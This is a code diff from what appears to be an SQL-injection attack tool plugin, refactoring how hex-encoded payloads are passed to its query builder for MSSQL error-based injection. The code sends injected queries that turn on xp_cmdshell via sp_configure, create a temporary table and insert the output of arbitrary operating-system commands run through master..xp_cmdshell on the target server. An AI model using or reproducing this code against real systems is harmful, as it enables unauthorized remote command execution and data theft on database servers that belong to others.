@@ -143,30 +143,30 @@ class Worker(QtCore.QThread):
         self.logSignal.emit("*** [" + PLUGIN_NAME + "]: TASK DONE ***")
     
     def enable_xp_cmd(self):
-        self.vars['hex'] = core.txtproc.strToHex(\
+        hex = core.txtproc.strToHex(\
         "sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure", True)
-        query =  self.wq.buildQuery(core.txtproc.correctQstr(self.qstrings['mssql_error_based']['exec_cmdshell']), self.vars)
+        query =  self.wq.buildQuery(core.txtproc.correctQstr(self.qstrings['mssql_error_based']['exec_hex']), self.vars, {'hex' : hex})
         self.wq.httpRequest(query, True, self.vars)
         self.progressSignal.emit(0, True)
         
     def xp_cmdshell(self):
-        execStr = core.txtproc.correctQstr(self.qstrings['mssql_error_based']['exec_cmdshell'])
+        execStr = core.txtproc.correctQstr(self.qstrings['mssql_error_based']['exec_hex'])
         
         #Delete tmp_table if already exist
-        self.vars['hex'] = core.txtproc.strToHex("drop table dtpropertie", True)
-        query = self.wq.buildQuery(execStr, self.vars)
+        hex = core.txtproc.strToHex("drop table dtpropertie", True)
+        query = self.wq.buildQuery(execStr, self.vars, {'hex' : hex})
         self.wq.httpRequest(query, True, self.vars)
         
         #Creating tmp table
-        self.vars['hex'] = core.txtproc.strToHex(\
+        hex = core.txtproc.strToHex(\
         "create table dtpropertie (num int identity, result varchar(8000) NULL, primary key (num))", True)
-        query = self.wq.buildQuery(execStr, self.vars)
+        query = self.wq.buildQuery(execStr, self.vars, {'hex' : hex})
         self.wq.httpRequest(query, True, self.vars)
 
         #Inserting xp_cmdshell output to temp table
-        self.vars['hex'] = core.txtproc.strToHex(\
+        hex = core.txtproc.strToHex(\
         "insert dtpropertie exec master..xp_cmdshell '" + self.vars['cmd'] + "'", True)
-        query = self.wq.buildQuery(execStr, self.vars)
+        query = self.wq.buildQuery(execStr, self.vars, {'hex' : hex})
         self.wq.httpRequest(query, True, self.vars)
         
         #Define query string for current injection type
